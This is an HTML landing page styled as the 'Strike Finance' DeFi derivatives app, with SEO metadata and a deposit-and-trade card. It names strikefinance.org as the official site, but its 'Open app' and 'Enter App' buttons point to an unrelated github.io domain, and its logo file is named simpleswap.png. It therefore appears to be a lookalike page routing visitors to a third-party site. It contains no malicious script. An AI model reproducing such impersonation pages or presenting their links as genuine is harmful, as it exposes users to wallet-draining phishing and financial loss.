<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Strike Finance</title>
  <meta name="description" content="Strike Finance is a DeFi trading platform for on-chain derivatives, wallet-based deposits, and trade execution.">
  <link rel="canonical" href="https://strike-finance-page.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F4EF">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Strike Finance">
  <meta property="og:description" content="Strike Finance is a DeFi trading platform for on-chain derivatives, wallet-based deposits, and trade execution.">
  <meta property="og:url" content="https://strike-finance-page.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Strike Finance">
  <meta name="twitter:description" content="Strike Finance is a DeFi trading platform for on-chain derivatives, wallet-based deposits, and trade execution.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://strike-finance-page.github.io/#website",
        "url": "https://strike-finance-page.github.io/",
        "name": "Strike Finance",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://strike-finance-page.github.io/#app",
        "name": "Strike Finance",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://strike-finance-page.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://strike-finance-page.github.io/#organization",
        "name": "Strike Finance",
        "url": "https://www.strikefinance.org/",
        "logo": "https://strike-finance-page.github.io/favicon.png"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Strike Finance home">
      <img src="simpleswap.png" width="30" height="30" alt="">
      <span>Strike Finance</span>
    </a>

    <nav class="nav" aria-label="Authority references">
      <a href="https://www.strikefinance.org/" target="_blank" rel="nofollow noopener noreferrer">Strike</a>
      <a href="https://cardanoscan.io/" target="_blank" rel="nofollow noopener noreferrer">Cardanoscan</a>
      <a href="https://ethereum.org/en/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi</a>
    </nav>

    <span class="spacer" aria-hidden="true"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Strike Finance">
      <h1>Strike Finance</h1>
      <p class="value"><strong>Strike Finance</strong> is a DeFi interface for wallet-based deposits and on-chain derivatives trading.</p>
    </section>

    <section class="app-card" aria-label="Trade setup">
      <div class="route">
        <div class="leg">
          <span class="label">Deposit</span>
          <span class="chip">
            <img src="btc.png" width="28" height="28" alt="BTC collateral">
            <span>BTC collateral</span>
          </span>
        </div>

        <button class="switch" type="button" data-switch aria-label="Switch trade direction">
          <span aria-hidden="true">&#8594;</span>
        </button>

        <div class="leg">
          <span class="label">Trade</span>
          <span class="chip">
            <img src="eth.png" width="28" height="28" alt="ETH market">
            <span>ETH-PERP</span>
          </span>
        </div>
      </div>

      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="footer">Strike Finance &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
</html>
